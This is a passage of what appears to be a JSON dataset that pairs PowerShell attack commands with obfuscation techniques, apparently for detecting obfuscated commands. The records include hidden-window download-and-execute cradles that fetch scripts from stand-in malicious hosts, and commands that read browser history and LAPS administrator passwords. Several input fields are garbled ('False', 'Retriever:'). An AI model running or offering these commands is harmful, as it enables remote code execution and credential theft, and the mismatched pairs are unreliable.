    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "origin_cmd": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.it/exWin64.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "output": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject.ps1')\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject.ps1')\""
  },
  {
    "input": ": To: Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject.ps1')\""
  },
  {
    "input": ". A: this post: Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject.ps1')\""
  },
  {
    "input": ": To: Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject.ps1')\""
  },
  {
    "input": ". A: this post: Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject.ps1')\""
  },
  {
    "input": ": To: Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject.ps1')\""
  },
  {
    "input": ". A: this post: Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject.ps1')\""
  },
  {
    "input": ": To: Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject.ps1')\""
  },
  {
    "input": ". A: this post: Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious GitHub repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "output": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://GitExample.com/maliciouscode.ps1')\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://GitExample.com/maliciouscode.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a potentially malicious Git repository.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://GitExample.com/maliciouscode.ps1')\""
  },
  {
    "input": ": This is my paraphrase: Download and execute a PowerShell script from a potentially malicious Git repository.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://GitExample.com/maliciouscode.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://GitExample.com/maliciouscode.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://GitExample.com/maliciouscode.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a potentially malicious Git repository.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://GitExample.com/maliciouscode.ps1')\""
  },
  {
    "input": ": This is my paraphrase: Download and execute a PowerShell script from a potentially malicious Git repository.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://GitExample.com/maliciouscode.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://GitExample.com/maliciouscode.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://GitExample.com/maliciouscode.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a potentially malicious Git repository.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://GitExample.com/maliciouscode.ps1')\""
  },
  {
    "input": ": This is my paraphrase: Download and execute a PowerShell script from a potentially malicious Git repository.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://GitExample.com/maliciouscode.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://GitExample.com/maliciouscode.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://GitExample.com/maliciouscode.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a potentially malicious Git repository.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://GitExample.com/maliciouscode.ps1')\""
  },
  {
    "input": ": This is my paraphrase: Download and execute a PowerShell script from a potentially malicious Git repository.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://GitExample.com/maliciouscode.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially malicious Git repository.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://GitExample.com/maliciouscode.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially dangerous website.",
    "output": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://webSiteExample.com/danger.ps1')\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Download and execute a PowerShell script from a potentially dangerous website.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://webSiteExample.com/danger.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a potentially dangerous website.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially dangerous website.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://webSiteExample.com/danger.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a potentially dangerous website. This is not a complete paraphrase: Download and execute a PowerShell script from a potentially dangerous website.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a potentially dangerous website.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://webSiteExample.com/danger.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially dangerous website.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially dangerous website.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://webSiteExample.com/danger.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially dangerous website.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a potentially dangerous website.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://webSiteExample.com/danger.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a potentially dangerous website.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially dangerous website.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://webSiteExample.com/danger.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a potentially dangerous website. This is not a complete paraphrase: Download and execute a PowerShell script from a potentially dangerous website.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a potentially dangerous website.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://webSiteExample.com/danger.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially dangerous website.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially dangerous website.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://webSiteExample.com/danger.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially dangerous website.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a potentially dangerous website.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://webSiteExample.com/danger.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a potentially dangerous website.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially dangerous website.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://webSiteExample.com/danger.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a potentially dangerous website. This is not a complete paraphrase: Download and execute a PowerShell script from a potentially dangerous website.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a potentially dangerous website.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://webSiteExample.com/danger.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially dangerous website.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially dangerous website.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://webSiteExample.com/danger.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially dangerous website.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a potentially dangerous website.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://webSiteExample.com/danger.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a potentially dangerous website.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially dangerous website.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://webSiteExample.com/danger.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a potentially dangerous website. This is not a complete paraphrase: Download and execute a PowerShell script from a potentially dangerous website.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a potentially dangerous website.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://webSiteExample.com/danger.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a potentially dangerous website.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a potentially dangerous website.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://webSiteExample.com/danger.ps1')\""
  },
  {
    "input": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "output": "Get-BrowserInformation -Browser All -Datatype History -UserName Charlie -Search 'republica'",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName Charlie -Search 'republica'"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName Charlie -Search 'republica'"
  },
  {
    "input": "Retriever:",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName Charlie -Search 'republica'"
  },
  {
    "input": "Retriever's information from their internet browsers .",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName Charlie -Search 'republica'"
  },
  {
    "input": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName Charlie -Search 'republica'"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName Charlie -Search 'republica'"
  },
  {
    "input": "Retriever:",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName Charlie -Search 'republica'"
  },
  {
    "input": "Retriever's information from their internet browsers .",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName Charlie -Search 'republica'"
  },
  {
    "input": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName Charlie -Search 'republica'"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName Charlie -Search 'republica'"
  },
  {
    "input": "Retriever:",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName Charlie -Search 'republica'"
  },
  {
    "input": "Retriever's information from their internet browsers .",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName Charlie -Search 'republica'"
  },
  {
    "input": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName Charlie -Search 'republica'"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName Charlie -Search 'republica'"
  },
  {
    "input": "Retriever:",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName Charlie -Search 'republica'"
  },
  {
    "input": "Retriever's information from their internet browsers .",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve browser history information for the user \"Charlie\" with the specified search term.",
    "origin_cmd": "Get-BrowserInformation -Browser All -Datatype History -UserName Charlie -Search 'republica'"
  },
  {
    "input": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "output": "Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\\administrator | Format-Table -AutoSize",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "origin_cmd": "Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\\administrator | Format-Table -AutoSize"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "origin_cmd": "Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\\administrator | Format-Table -AutoSize"
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "origin_cmd": "Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\\administrator | Format-Table -AutoSize"
  },
  {
    "input": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "origin_cmd": "Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\\administrator | Format-Table -AutoSize"
  },
  {
    "input": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "origin_cmd": "Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\\administrator | Format-Table -AutoSize"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "origin_cmd": "Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\\administrator | Format-Table -AutoSize"
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "origin_cmd": "Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\\administrator | Format-Table -AutoSize"
  },
  {
